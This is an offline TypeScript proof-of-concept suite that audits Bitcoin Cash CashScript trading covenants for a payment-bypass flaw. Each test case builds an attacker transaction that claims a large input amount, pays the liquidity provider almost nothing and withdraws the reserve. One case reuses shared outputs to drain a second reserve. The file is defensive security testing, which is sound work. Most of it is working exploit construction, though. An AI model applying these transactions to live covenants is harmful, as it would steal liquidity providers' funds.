/**
 * Strategy Covenant Payment-Bypass PoC (offline, MockNetworkProvider)
 *
 * Every strategy fill function takes `amountIn` as a caller-supplied argument.
 * This suite checks whether the covenant actually requires that `amountIn` of
 * the input asset is delivered to the LP. Each case builds an attacker tx that
 * claims a large `amountIn`, pays the LP nothing, and walks off with reserve.
 *
 *   SAFE        = covenant rejected the attack
 *   VULNERABLE  = covenant accepted the attack (reserve drained for free)
 *
 * Usage: npx tsx test/mesh_test/PaymentBypass.poc.ts
 * Exits 1 if any covenant is vulnerable.
 */

import { Contract, TransactionBuilder } from 'cashscript';
import { hash160, sha256, secp256k1 } from '@bitauth/libauth';
import { readFileSync } from 'fs';
import { join } from 'path';
import {
    STRATEGY_ARTIFACT, ORACLE_ARTIFACT, RECYCLING_ARTIFACT, DUTCH_ARTIFACT,
    OWNER, ATTACKER, ORACLE, TOKEN_PUSD, TOKEN_MUSD, pusdLE, musdLE, BCH,
    p2pkh, provider, fakeTxid, section,
} from './_mesh_security_harness.js';

const SURPLUS_ARTIFACT = JSON.parse(
    readFileSync(join(import.meta.dirname ?? '.', '..', '..', 'artifacts', 'MeshStrategyWithSurplusCapture.json'), 'utf-8'),
);

let vulnerable = 0;
let safe = 0;

function attempt(name: string, stolen: bigint, build: () => TransactionBuilder) {
    try {
        build().debug();
        vulnerable++;
        console.log(`  🚨 VULNERABLE  ${name}  (attacker receives ${stolen} from LP reserve, pays LP 0)`);
    } catch (e: any) {
        safe++;
        console.log(`  ✅ SAFE        ${name}\n                rejected: ${String(e?.message ?? e).split('\n')[0].slice(0, 140)}`);
    }
}

const net = provider();
const RESERVE = 1_000_000n;
// 1 token of the input category: satisfies `tx.inputs[1].tokenCategory == tokenCategoryIn`
// and is simply returned to the attacker in change.
const dustTokenPusd = () => ({ txid: fakeTxid(), vout: 0, satoshis: 2_000n, token: { amount: 1n, category: TOKEN_PUSD } });
const feeUtxo = () => ({ txid: fakeTxid(), vout: 0, satoshis: 10_000n });

// ── 1. StrategyCovenant: pUSD in → BCH out ──────────────────────────────────
section('1. StrategyCovenant (pUSD → BCH, 1:1, 30 bps)');
{
    const c = new Contract(STRATEGY_ARTIFACT, [OWNER.pkh, pusdLE, BCH, 1n, 1n, 30n], { provider: net });
    const claimedIn = 1_000_000n;
    const out = (claimedIn * 9970n) / 10000n; // 997,000
    attempt('fill(amountIn=1,000,000) with 1 pUSD actually supplied, nothing paid to LP', out, () => {
        const tb = new TransactionBuilder({ provider: net });
        tb.addInput({ txid: fakeTxid(), vout: 0, satoshis: RESERVE }, c.unlock.fill(claimedIn));
        tb.addInput(dustTokenPusd(), ATTACKER.template.unlockP2PKH());
        tb.addInput(feeUtxo(), ATTACKER.template.unlockP2PKH());
        tb.addOutput({ to: c.address, amount: RESERVE - out });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: out });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: 1_000n, token: { amount: 1n, category: TOKEN_PUSD } });
        return tb;
    });
}

// ── 2. StrategyCovenant: BCH in → pUSD out ──────────────────────────────────
section('2. StrategyCovenant (BCH → pUSD, 1:1, 30 bps)');
{
    const c = new Contract(STRATEGY_ARTIFACT, [OWNER.pkh, BCH, pusdLE, 1n, 1n, 30n], { provider: net });
    const tokenReserve = 500_000n;
    const claimedIn = 500_000n;
    const out = (claimedIn * 9970n) / 10000n;
    attempt('fill(amountIn=500,000 sats) with 0 BCH paid to LP', out, () => {
        const tb = new TransactionBuilder({ provider: net });
        tb.addInput({ txid: fakeTxid(), vout: 0, satoshis: 2_000n, token: { amount: tokenReserve, category: TOKEN_PUSD } }, c.unlock.fill(claimedIn));
        tb.addInput(feeUtxo(), ATTACKER.template.unlockP2PKH());
        tb.addOutput({ to: c.tokenAddress, amount: 1_000n, token: { amount: tokenReserve - out, category: TOKEN_PUSD } });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: 1_000n, token: { amount: out, category: TOKEN_PUSD } });
        return tb;
    });
}

// ── 3. MeshStrategyWithSurplusCapture: attacker names itself as the "user" ───
section('3. MeshStrategyWithSurplusCapture (BCH → BCH 3x, used by server artifacts)');
{
    const TREASURY_PKH = hash160(Uint8Array.from([9, 9, 9]));
    const c = new Contract(SURPLUS_ARTIFACT, [OWNER.pkh, TREASURY_PKH, BCH, BCH, 300n, 100n, 0n], { provider: net });
    const claimedIn = 300_000n;
    const gross = 900_000n; // quotedMinOut = gross → zero surplus → no treasury/frontend outputs required
    attempt('fillWithSurplusCapture(amountIn=300,000, userMakerPkh=attacker, minOut=gross)', gross, () => {
        const tb = new TransactionBuilder({ provider: net });
        tb.addInput(feeUtxo(), ATTACKER.template.unlockP2PKH()); // input 0 (BCH-in: no category check)
        tb.addInput({ txid: fakeTxid(), vout: 0, satoshis: RESERVE },
            c.unlock.fillWithSurplusCapture(claimedIn, ATTACKER.pkh, ATTACKER.pkh, gross, 0n));
        tb.addOutput({ to: c.address, amount: RESERVE - gross });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: gross });
        return tb;
    });
}

// ── 4. OracleStrategyCovenant: valid oracle payload, no payment ──────────────
section('4. OracleStrategyCovenant (pUSD → BCH, oracle-signed price)');
{
    const pairId = 1n;
    const c = new Contract(ORACLE_ARTIFACT, [OWNER.pkh, ORACLE.pub, pairId, 10n, 25n, pusdLE, BCH], { provider: net });
    // payload: [ts:4LE][pairId:4LE][price:4LE], price scaled 1e8 → price 1.0
    const ts = 1_700_000_000;
    const msg = new Uint8Array(12);
    const dv = new DataView(msg.buffer);
    dv.setUint32(0, ts, true); dv.setUint32(4, Number(pairId), true); dv.setUint32(8, 100_000_000, true);
    // checkDataSig(sig, sha256(msg), pk) → OP_CHECKDATASIG hashes its message again: sign sha256(sha256(msg))
    const sig = secp256k1.signMessageHashSchnorr(ORACLE.priv, sha256.hash(sha256.hash(msg)));
    if (typeof sig === 'string') throw new Error(sig);
    const claimedIn = 900_000n;
    const eff = (100_000_000n * 10010n) / 10000n;
    const out = (claimedIn * 100_000_000n * 9975n) / (eff * 10000n);
    attempt('fillWithOracle(amountIn=900,000) with 1 pUSD supplied (also: stale payload from 2023 accepted?)', out, () => {
        const tb = new TransactionBuilder({ provider: net });
        tb.setLocktime(ts + 10);
        tb.addInput({ txid: fakeTxid(), vout: 0, satoshis: RESERVE }, c.unlock.fillWithOracle(claimedIn, msg, sig));
        tb.addInput(dustTokenPusd(), ATTACKER.template.unlockP2PKH());
        tb.addInput(feeUtxo(), ATTACKER.template.unlockP2PKH());
        tb.addOutput({ to: c.address, amount: RESERVE - out });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: out });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: 1_000n, token: { amount: 1n, category: TOKEN_PUSD } });
        return tb;
    });
}

// ── 5. DutchDecayStrategyCovenant ────────────────────────────────────────────
section('5. DutchDecayStrategyCovenant (pUSD → BCH)');
{
    const start = 1_700_000_000n;
    const c = new Contract(DUTCH_ARTIFACT, [OWNER.pkh, pusdLE, BCH, 100n, 90n, 100n, start, 3600n, 30n], { provider: net });
    const claimedIn = 1_000_000n;
    const out = (claimedIn * 100n * 9970n) / (100n * 10000n);
    attempt('fillDutch(amountIn=1,000,000) with 1 pUSD supplied', out, () => {
        const tb = new TransactionBuilder({ provider: net });
        tb.setLocktime(Number(start));
        tb.addInput({ txid: fakeTxid(), vout: 0, satoshis: RESERVE }, c.unlock.fillDutch(claimedIn));
        tb.addInput(dustTokenPusd(), ATTACKER.template.unlockP2PKH());
        tb.addInput(feeUtxo(), ATTACKER.template.unlockP2PKH());
        tb.addOutput({ to: c.address, amount: RESERVE - out });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: out });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: 1_000n, token: { amount: 1n, category: TOKEN_PUSD } });
        return tb;
    });
}

// ── 6. MultiPairRecyclingCovenant: payment IS enforced — check single + double-spend-of-output ──
section('6. MultiPairRecyclingCovenant (pUSD/mUSD → BCH, pays into reverse covenant)');
{
    const reverseHash = sha256.hash(Uint8Array.from([7, 7, 7]));
    const reverseLock = Uint8Array.from([0xaa, 0x20, ...reverseHash, 0x87]);
    const c = new Contract(RECYCLING_ARTIFACT, [OWNER.pkh, BCH, pusdLE, 1n, 1n, musdLE, 1n, 1n, 30n, reverseHash], { provider: net });
    const claimedIn = 1_000_000n;
    const out = (claimedIn * 9970n) / 10000n;
    attempt('fillAndRecycle(amountIn=1,000,000) with only 1 pUSD delivered to reverse covenant', out, () => {
        const tb = new TransactionBuilder({ provider: net });
        tb.addInput({ txid: fakeTxid(), vout: 0, satoshis: RESERVE }, c.unlock.fillAndRecycle(claimedIn, 1n));
        tb.addInput(dustTokenPusd(), ATTACKER.template.unlockP2PKH());
        tb.addInput(feeUtxo(), ATTACKER.template.unlockP2PKH());
        tb.addOutput({ to: c.address, amount: RESERVE - out });
        tb.addOutput({ to: reverseLock, amount: 1_000n, token: { amount: 1n, category: TOKEN_PUSD } });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: out });
        return tb;
    });

    // Two UTXOs at the SAME covenant address in one tx: both inputs validate
    // against outputs[0..2], so one honest payment "counts" for both.
    const r = 500_000n;
    const a = 100_000n;
    const o = (a * 9970n) / 10000n;
    const inputs = 2n * r;
    attempt('two same-address UTXOs share outputs[0..2] (pay once, drain second reserve)', inputs - (r - o) - o, () => {
        const pusdIn = { txid: fakeTxid(), vout: 0, satoshis: 2_000n, token: { amount: a, category: TOKEN_PUSD } };
        const tb = new TransactionBuilder({ provider: net });
        tb.addInput({ txid: fakeTxid(), vout: 0, satoshis: r }, c.unlock.fillAndRecycle(a, 1n));
        tb.addInput({ txid: fakeTxid(), vout: 1, satoshis: r }, c.unlock.fillAndRecycle(a, 1n));
        tb.addInput(pusdIn, ATTACKER.template.unlockP2PKH());
        tb.addOutput({ to: c.address, amount: r - o });
        tb.addOutput({ to: reverseLock, amount: 1_000n, token: { amount: a, category: TOKEN_PUSD } });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: o });
        tb.addOutput({ to: p2pkh(ATTACKER.pkh), amount: r - 2_000n }); // second reserve walks away
        return tb;
    });
}

console.log(`\n═══ Payment-bypass PoC: ${vulnerable} VULNERABLE, ${safe} SAFE ═══`);
if (vulnerable > 0) process.exit(1);
